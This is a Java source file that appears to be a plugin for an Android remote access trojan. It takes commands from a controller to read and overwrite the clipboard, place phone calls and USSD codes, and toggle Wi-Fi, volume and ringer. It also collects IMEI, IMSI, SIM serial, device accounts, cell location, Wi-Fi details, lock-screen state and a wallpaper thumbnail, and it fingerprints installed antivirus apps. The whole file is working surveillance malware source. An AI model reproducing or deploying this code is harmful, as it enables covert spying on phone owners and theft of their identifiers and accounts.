package plugens.angel.plugens;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.WallpaperManager;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.RectF;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
public class info {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
            String[] d = s.split(SPL_DATA);
            switch(d[0]){
                case "set":
                    setClipboard(c,d[1]);
                    break;
                case "get":
                    String cli = OBJ + SPL_DATA + readClipboard(c) ;
                    f =  cli.getBytes();
                    break;
                case "call":
                    CallPhone(c,d[1]);
                case "info":
                    String osName = System.getProperty("os.name");
                    String Release =  CODES() + Build.VERSION.RELEASE ;
                    String name = "null";
                    String uID;
                    if(gt(c,d[1]).length() != 0){
                        name = gt(c,d[1]);
                    }
                    if(gt(c,d[2]).length() == 0){
                        uID = UUID.randomUUID().toString();
                        dit(c,uID,d[2]);
                    }else{
                        uID = gt(c,d[2]);
                    }
                    String att = at(c);
                    String s0 = OBJ + SPL_DATA + dnm(c) + SPL_DATA + osName + SPL_DATA + Release + SPL_DATA + "v2.0" + SPL_DATA + name + SPL_DATA + uID + SPL_DATA + att
                            + SPL_DATA + Wallpaper(c,48,48) + SPL_DATA + s(c);
                    f =  s0.getBytes();
                    break;
                case "gsm":
                    try {
                        final TelephonyManager t = (TelephonyManager) c.getSystemService(c.TELEPHONY_SERVICE);
                        String n = t.getSimOperator();
                        if (!TextUtils.isEmpty(n)) {
                            @SuppressLint("MissingPermission")
                            GsmCellLocation loc = (GsmCellLocation) t.getCellLocation();
                            String MCC = n.substring(0, 3);
                            String MNC = n.substring(3);
                            String CID = Integer.toString(loc.getCid());
                            String LAC = Integer.toString(loc.getLac());
                            String s1 = OBJ + SPL_DATA + MCC + SPL_DATA + MNC + SPL_DATA + LAC + SPL_DATA + CID;
                            f =  s1.getBytes();
                        }
                    } catch (Exception e) {}
                    break;
                case "edit":
                     try{
                         dit(c,d[1],d[2]);
                         dit(c,d[3],d[4]);
                     } catch (Exception e) {}
                    break;
                case "rename":
                    try{
                        dit(c,d[1],d[2]);
                    } catch (Exception e) {}
                    break;

                case "account":
                    StringBuffer sb = new StringBuffer();
                    try {
                        @SuppressLint("MissingPermission") Account[] accounts = AccountManager.get(c).getAccounts();
                        for (Account account : accounts) {
                            sb.append(account.type + SPL_ARRAY + account.name + SPL_LINE);
                        }
                    } catch (Exception e) {}

                    String s1 = OBJ + SPL_DATA + sb.toString() ;
                    f =  s1.getBytes();
                    break;
                case "information":
                    StringBuffer si = new StringBuffer();
                            si.append(dnm(c) + SPL_LINE);
                            si.append(Build.MODEL + SPL_LINE);
                            si.append(Build.BOARD + SPL_LINE);
                            si.append(Build.BRAND + SPL_LINE);
                            si.append(Build.BOOTLOADER + SPL_LINE);
                            si.append(Build.DISPLAY + SPL_LINE);
                            si.append(Build.HARDWARE + SPL_LINE);
                            si.append(Build.HOST + SPL_LINE);
                            si.append(Build.ID + SPL_LINE);
                            si.append(Build.MANUFACTURER + SPL_LINE);
                            si.append(Build.SERIAL + SPL_LINE);
                            si.append(CODES() + SPL_LINE);
                            si.append(Build.VERSION.RELEASE + SPL_LINE);
                            si.append(Build.VERSION.SDK_INT + SPL_LINE);
                            si.append(Locale.getDefault().getDisplayLanguage() + SPL_LINE);

                        final TelephonyManager t = (TelephonyManager) c.getSystemService(c.TELEPHONY_SERVICE);
                        String n = t.getSimOperator();
                        if (!TextUtils.isEmpty(n)) {

                            String NON = t.getNetworkOperatorName();
                            if (NON.trim().length()==0){
                                NON = "n/a";
                            }

                            si.append(NON + SPL_LINE);

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                @SuppressLint("MissingPermission") String i0 = t.getImei();
                                si.append(i0 + SPL_LINE);
                            } else {
                                @SuppressLint("MissingPermission") String i1 = t.getDeviceId();
                                si.append(i1 + SPL_LINE);
                            }

                            String stc = t.getSimCountryIso();
                            if (stc.trim().length()==0){
                                stc = "n/a";
                            }
                            si.append(stc + SPL_LINE);

                            @SuppressLint("MissingPermission") String sr = t.getSimSerialNumber();
                            si.append(sr + SPL_LINE);
                            si.append(cn(c) + SPL_LINE);

                            @SuppressLint("MissingPermission") String IMsi = t.getSubscriberId();
                            si.append(IMsi + SPL_LINE);

                        }else{
                            for(int fix = 0 ; fix < 6 ; fix++){
                                si.append("null" + SPL_LINE);
                            }
                        }
                    final WifiManager wm = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
                    final ConnectivityManager m = (ConnectivityManager)c.getSystemService(Context.CONNECTIVITY_SERVICE);
                    @SuppressLint("MissingPermission") final NetworkInfo w = m.getActiveNetworkInfo();
                    if(w.getType() == ConnectivityManager.TYPE_WIFI) {
                        WifiInfo fo = wm.getConnectionInfo();
                        String adr = fo.getMacAddress();
                        String sID = fo.getSSID();
                        int SP = fo.getLinkSpeed();
                        int RS = WifiManager.calculateSignalLevel(fo.getRssi(), 5);
                        si.append(adr + SPL_LINE);
                        si.append(sID + SPL_LINE);
                        si.append(Integer.toString(SP) + SPL_LINE);
                        si.append(Integer.toString(RS) + SPL_LINE);
                    }else{
                        for(int fix = 0 ; fix < 4 ; fix++){
                            si.append("null" + SPL_LINE);
                        }
                    }
                        Intent intent = c.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
                        int lev = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
                        int sc = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                        int per = (lev * 100) / sc;
                        int plu = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
                        boolean usb = plu == BatteryManager.BATTERY_PLUGGED_AC || plu == BatteryManager.BATTERY_PLUGGED_USB;
                        si.append(String.valueOf(per) + SPL_LINE);
                        si.append(usb + SPL_LINE);
                    final PowerManager pow = (PowerManager)c.getSystemService(Context.POWER_SERVICE);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        si.append(pow.isDeviceIdleMode() + SPL_LINE);

                        si.append(pow.isPowerSaveMode() + SPL_LINE);

                        si.append(pow.isInteractive() + SPL_LINE);
                    }else{
                        si.append("n/a" + SPL_LINE);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            si.append(pow.isPowerSaveMode() + SPL_LINE);
                        }else{
                            si.append("null" + SPL_LINE);
                        }
                        si.append(pow.isScreenOn() + SPL_LINE);
                    }


                    final AudioManager au = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                    int max = au.getStreamMaxVolume(AudioManager.STREAM_RING);
                    int vol = au.getStreamVolume(AudioManager.STREAM_RING);
                    si.append(max + SPL_LINE);
                    si.append(vol + SPL_LINE);
                    max = au.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                    vol = au.getStreamVolume(AudioManager.STREAM_MUSIC);
                    si.append(max + SPL_LINE);
                    si.append(vol + SPL_LINE);
                    max = au.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION);
                    vol = au.getStreamVolume(AudioManager.STREAM_NOTIFICATION);
                    si.append(max + SPL_LINE);
                    si.append(vol + SPL_LINE);
                    max = au.getStreamMaxVolume(AudioManager.STREAM_SYSTEM);
                    vol = au.getStreamVolume(AudioManager.STREAM_SYSTEM);
                    si.append(max + SPL_LINE);
                    si.append(vol + SPL_LINE);
                    switch(au.getRingerMode()){
                        case AudioManager.RINGER_MODE_NORMAL:
                            si.append("0" + SPL_LINE);
                            break;
                        case AudioManager.RINGER_MODE_VIBRATE:
                            si.append("1" + SPL_LINE);
                            break;
                        case AudioManager.RINGER_MODE_SILENT:
                            si.append("2" + SPL_LINE);
                            break;
                    }
                    final WifiManager wi = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
                    if (wi.isWifiEnabled()) {
                        si.append("1" + SPL_LINE);
                    }else{
                        si.append("0" + SPL_LINE);
                    }



                    String s2 = OBJ + SPL_DATA + si.toString() ;
                    f =  s2.getBytes();
                    break;
                case "ring":
                    try {
                        final AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                        am.setStreamVolume(AudioManager.STREAM_RING, Integer.valueOf(d[1].trim()), 0);
                    } catch (Exception e) {}
                    break;
                case "music":
                    try {
                        final AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, Integer.valueOf(d[1].trim()), 0);
                    } catch (Exception e) {}
                    break;
                case "notification":
                    try {
                        final AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                        am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, Integer.valueOf(d[1].trim()), 0);
                    } catch (Exception e) {}
                    break;
                case "system":
                    try {
                        final AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                        am.setStreamVolume(AudioManager.STREAM_SYSTEM, Integer.valueOf(d[1].trim()), 0);
                    } catch (Exception e) {}
                    break;
                case "ringer_mode":
                    try {
                        final AudioManager am = (AudioManager) c.getSystemService(Context.AUDIO_SERVICE);
                        switch (Integer.valueOf(d[1].trim())) {
                            case 0:
                                am.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                                break;
                            case 1:
                                am.setRingerMode(AudioManager.RINGER_MODE_VIBRATE);
                                break;
                            case 2:
                                am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                                break;
                            default:
                                break;
                        }
                    } catch (Exception e) {}
                    break;
                case "wifi_mode":
                    try {
                        final WifiManager wifi = (WifiManager) c.getSystemService(Context.WIFI_SERVICE);
                        switch (Integer.valueOf(d[1].trim())) {
                            case 0:
                                wifi.setWifiEnabled(false);
                                break;
                            case 1:
                                wifi.setWifiEnabled(true);
                                break;
                            case 2:
                                wifi.setWifiEnabled(false);
                                wifi.setWifiEnabled(true);
                                break;
                            default:
                                break;
                        }
                    } catch (Exception e) {}
                    break;
                case "update":
                    try {
                        String cok = OBJ + SPL_DATA + Wallpaper(c,48,48) + SPL_DATA + s(c);
                        f =  cok.getBytes();
                    } catch (Exception e) {}
                    break;
            }
        return f;
    }
    private void setClipboard(final Context ctx,final String str) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try{
                    try{
                        ClipboardManager clipboard = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                        clipboard.setPrimaryClip(ClipData.newPlainText("text/plain", str));
                    } catch (Exception e) {}

                } catch (Exception e) {}
            }
        }, 1000);

    }


    private String D = "";
    private String readClipboard(final Context ctx) {
        final CountDownLatch latch = new CountDownLatch(1);
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try{
                    ClipboardManager clipboard = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                    if (clipboard.hasPrimaryClip()) {
                        android.content.ClipDescription description = clipboard.getPrimaryClipDescription();
                        android.content.ClipData data = clipboard.getPrimaryClip();
                        if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)){
                            D = String.valueOf(data.getItemAt(0).getText());
                        }
                    }
                } catch (Exception e) {}
                latch.countDown();
            }
        }, 1000);

        try {
            latch.await();
        } catch (InterruptedException e) {}

        return D;
    }

    private void CallPhone(Context ctx, String number){
        if(number == ""){
            return;
        }
        try {
            number = number.replace("*", Uri.encode("*")).replace("#",Uri.encode("#"));
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse(number));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {}
    }


    private String gt(Context ctx, String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            String q = s.getString(k, "");
            if(!q.equalsIgnoreCase(""))
            {
                return q;
            }else{
                return "";
            }
        } catch (Exception e) {
            return "";
        }
    }
    private void dit(Context ctx , String v , String k) {
        try {
            SharedPreferences s = PreferenceManager
                    .getDefaultSharedPreferences(ctx);
            SharedPreferences.Editor e = s.edit();
            e.putString(k, v.trim());
            e.commit();
        } catch (Exception e) {}

    }
    public String cn(Context ctx) {
        String ns = "n/a";
        try{
            final ConnectivityManager m = (ConnectivityManager)ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
            @SuppressLint("MissingPermission") final android.net.NetworkInfo mb = m.getActiveNetworkInfo();
             if(mb.getType() == ConnectivityManager.TYPE_MOBILE ){
                TelephonyManager mtm = (TelephonyManager)
                        ctx.getSystemService(Context.TELEPHONY_SERVICE);
                int nt = mtm.getNetworkType();
                switch (nt) {
                    case TelephonyManager.NETWORK_TYPE_GPRS:
                    case TelephonyManager.NETWORK_TYPE_EDGE:
                    case TelephonyManager.NETWORK_TYPE_CDMA:
                    case TelephonyManager.NETWORK_TYPE_1xRTT:
                    case TelephonyManager.NETWORK_TYPE_IDEN:
                        ns = "2G";
                        break;
                    case TelephonyManager.NETWORK_TYPE_UMTS:
                    case TelephonyManager.NETWORK_TYPE_EVDO_0:
                    case TelephonyManager.NETWORK_TYPE_EVDO_A:
                    case TelephonyManager.NETWORK_TYPE_HSUPA:
                    case TelephonyManager.NETWORK_TYPE_HSPA:
                    case TelephonyManager.NETWORK_TYPE_EVDO_B:
                    case TelephonyManager.NETWORK_TYPE_EHRPD:
                    case TelephonyManager.NETWORK_TYPE_HSPAP:
                    case TelephonyManager.NETWORK_TYPE_HSDPA:
                        ns = "3G";
                        break;
                    case TelephonyManager.NETWORK_TYPE_LTE:
                        ns = "4G";
                        break;
                    default:
                        ns = "n/a";
                        break;
                }
            }
        } catch (Exception e) {}
        return ns;
    }
    private String CODES() {
        String nm = "";
        int i = android.os.Build.VERSION.SDK_INT;
        if (android.os.Build.VERSION_CODES.LOLLIPOP == i) {
            nm = "Lollipop";
        }else if  (Build.VERSION_CODES.LOLLIPOP_MR1 == i) {
            nm = "Lollipop++";
        }else if (Build.VERSION_CODES.M == i) {
            nm = "Marshmallow";
        } else if (Build.VERSION_CODES.N == i) {
            nm = "Nougat";
        } else if (Build.VERSION_CODES.N_MR1 == i) {
            nm = "Nougat++";
        } else if (Build.VERSION_CODES.O == i) {
            nm = "Oreo";
        } else if (Build.VERSION_CODES.O_MR1 == i) {
            nm = "Oreo++";
        } else if (Build.VERSION_CODES.P == i) {
            nm = "Pie";
        }
        if(nm.length() != 0){
            return nm + " ";
        }else {
            return "";
        }
    }
    private String at(Context c) {
        String nm = "";
        if (at(c,"com.Avira.android")) {
            nm = "Avira";
        }else if  (at(c,"org.malwarebytes.antimalware")) {
            nm = "Malwarebytes";
        }else if (at(c,"com.avast.android.mobilesecurity")) {
            nm = "Avast";
        } else if (at(c,"com.eset.ems2.gp")) {
            nm = "ESET";
        } else if (at(c,"com.wsandroid.suite")) {
            nm = "McAfee";
        } else if (at(c,"com.kms.free")) {
            nm = "Kaspersky";
        } else if (at(c,"com.drweb")) {
            nm = "Dr.Web";
        } else if (at(c,"com.antivirus.totalsecurity.cleaner.free.booster")) {
            nm = "360 Antivirus";
        } else if (at(c,"com.avg.cleaner")) {
            nm = "AVG";
        } else if (at(c,"com.bitdefender.security")) {
            nm = "Bitdefender";
        } else if (at(c,"com.sophos.smsec")) {
            nm = "Sophos";
        } else if (at(c,"com.bitdefender.antivirus")) {
            nm = "Bitdefender";
        } else if (at(c,"com.qihoo.security.lite")) {
            nm = "360 Security Lite";
        } else if (at(c,"com.samsung.android.lool")) {
            nm = "McAfee";
        }
        if(nm.length() != 0){
            return nm ;
        }else {
            return "null";
        }
    }
    private String dnm(Context c) {
        String nm = "";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR1) {
            try{
                nm = Settings.Global.getString(c.getContentResolver(), Settings.Global.DEVICE_NAME);
            } catch (Exception e) {}
        }
        if(nm.length() == 0){
            nm = Build.MODEL;
        }
        if(nm.length() != 0){
            return nm ;
        }else {
            return "null";
        }
    }
    private boolean at(Context c, String n) {
        try {
            c.getPackageManager().getApplicationInfo(n, 0);
            return true;
        }
        catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public Bitmap scaleCenterCrop(Bitmap source, int newHeight, int newWidth) {
        int sourceWidth = source.getWidth();
        int sourceHeight = source.getHeight();
        float xScale = (float) newWidth / sourceWidth;
        float yScale = (float) newHeight / sourceHeight;
        float scale = Math.max(xScale, yScale);
        float scaledWidth = scale * sourceWidth;
        float scaledHeight = scale * sourceHeight;
        float left = (newWidth - scaledWidth) / 2;
        float top = (newHeight - scaledHeight) / 2;
        RectF targetRect = new RectF(left, top, left + scaledWidth, top + scaledHeight);
        Bitmap dest = Bitmap.createBitmap(newWidth, newHeight, source.getConfig());
        Canvas canvas = new Canvas(dest);
        canvas.drawBitmap(source, null, targetRect, null);
        return dest;
    }
    public String Wallpaper(Context ctx, int xx , int yy)  {
        String v ;
        try {
            WallpaperManager m = WallpaperManager.getInstance(ctx);
            Drawable d = m.getDrawable();
            Drawable x = d;
            if(x !=null) {
                BitmapDrawable b = ((BitmapDrawable) x);
                Bitmap i = scaleCenterCrop(b.getBitmap(), xx, yy);
                ByteArrayOutputStream o = new ByteArrayOutputStream();
                i.compress(Bitmap.CompressFormat.JPEG, 100, o);
                byte[] y = o.toByteArray();
                v = Base64.encodeToString(y, Base64.NO_WRAP);
            }else{
                v = "-1";
            }
        } catch (Exception e) {
            v = "-1";
        }catch(OutOfMemoryError e){
            v = "-1";
        }
        return v;
    }
    public String s (Context ctx){
        String v ;
        try {
            final KeyguardManager k = (KeyguardManager)ctx.getSystemService(Context.KEYGUARD_SERVICE);
            final PowerManager p = (PowerManager)ctx.getSystemService(Context.POWER_SERVICE);
            boolean isScreenOn = p.isScreenOn();
            if (k.inKeyguardRestrictedInputMode()) {
                if (isScreenOn == true) {
                    v = "0";
                } else {
                    v = "1";
                }
            } else {
                if (isScreenOn == true) {
                    v = "2";
                } else {
                    v = "3";
                }
            }
        } catch (Exception e) {
            v = "-1";
        }
        return v;
    }
}
